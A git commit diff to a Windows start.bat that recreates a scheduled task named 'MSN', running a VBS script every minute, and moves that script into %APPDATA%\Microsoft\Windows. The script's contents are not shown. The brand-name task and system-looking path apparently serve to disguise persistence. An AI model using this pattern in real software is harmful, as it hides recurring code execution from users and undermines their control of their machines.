917bd91e990687814ca86fc8776d6da449e58d3a
mr-slugworth <58490989+mr-slugworth@users.noreply.github.com>
2019-12-04 21:59:21 -0500

    Update start.bat

--- start.bat
+++ start.bat
@@ -1,2 +1,2 @@
 schtasks /delete /tn "MSN" /f
-schtasks /create /sc minute /mo 1 /tn "MSN" /tr "%USERPROFILE%\folder\msn-news.vbs"
+schtasks /create /sc minute /mo 1 /tn "MSN" /tr "%APPDATA%\Microsoft\Windows\msn-news.vbs"
